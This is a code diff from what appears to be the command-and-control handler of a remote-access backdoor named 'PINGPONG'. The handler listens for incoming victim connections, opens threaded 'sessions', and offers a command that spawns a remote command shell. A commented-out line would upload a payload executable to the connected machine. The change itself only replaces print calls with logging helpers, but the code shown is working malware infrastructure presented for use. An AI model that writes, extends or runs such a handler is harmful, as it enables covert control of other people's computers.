@@ -22,7 +22,7 @@ def startserver(ip, port, printf, open_ac):
         try:
             port = int(port)
         except:
-            print("handler>[-]port input error")
+            main.print_error("handler>[-]port input error")
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -30,27 +30,27 @@ def startserver(ip, port, printf, open_ac):
             s.bind((ip, port))
             s.listen(10)
         except:
-            print("handler[-]Failed to bind on " + ip + ":" + port)
-            print("handler[-]Bind on 127.0.0.1:624")
+            main.print_error("handler[-]Failed to bind on " + ip + ":" + port)
+            main.print_normal("handler[*]Bind on 127.0.0.1:624")
             startserver("127.0.0.1", "624", True, False)
     except socket.error as msg:
-        print("handler>[-]something went WRONG, print out the wrong msg: " + str(msg))
+        main.print_error("handler>[-]something went WRONG, print out the wrong msg: " + str(msg))
         sys.exit(1)
     if printf:
-        print('handler>[*]Starting handler at ' + ip + ":" + str(port))
+        main.print_normal('handler>[*]Starting handler at ' + ip + ":" + str(port))
 
     while True:
         try:
             conn, addr = s.accept()
         except KeyboardInterrupt:
-            print("handler>[*]Stoping......")
+            main.print_normal("handler>[*]Stoping......")
             main.startserver()
         import PINGPONG_script.upload
         _ip = addr[0]
         _port = addr[1]
         # PINGPONG_script.upload.Upload(_ip, "./payload/upload_payload/PINGPONG_payload.exe", "D:/TEMP", False, False, conn, "")
         if printf:
-            print('handler>[+]PINGPONG session Created: ' + ip + ":" + str(port) + " >>> " + _ip + ":" + str(_port))
+            main.print_normal('handler>[*]PINGPONG session Created: ' + ip + ":" + str(port) + " >>> " + _ip + ":" + str(_port))
         t = threading.Thread(target=PINGPONG_shell, args=(conn, ip, port, _ip, str(_port), True, AUTORUNSCRIPT, open_ac))
         t.start()
 #连接程序
@@ -68,13 +68,13 @@ def PINGPONG_shell(conn, my_ip, my_port, ip, port, printf, AUTOCOMMAND, op_ac):
             is_Auto = True
         if command == "exit" or command == "EXIT":
             conn.send(bytes("EXIT_APP", 'utf8'))
-            print("PINGPONG>[*]PINGPONG session Died, reason: User exit")
-            print("handler>[*]Back to main console......")
+            main.print_normal("PINGPONG>[*]PINGPONG session Died, reason: User exit")
+            main.print_normal("handler>[*]Back to main console......")
             main.main()
         if command == "cmd" or command == "CMD":
             import PINGPONG_script.cmdshell
             if PINGPONG_script.addsend.App_send("CMDSHELL_APP", True, conn):
-                print("PINGPONG>[+]GOT IT")
+                main.print_good("PINGPONG>[+]GOT IT")
                 cmd_port = random.randint(5000, 8000)
                 conn.send(bytes(str(cmd_port), "utf8"))
                 PINGPONG_script.cmdshell.start(my_ip, cmd_port)
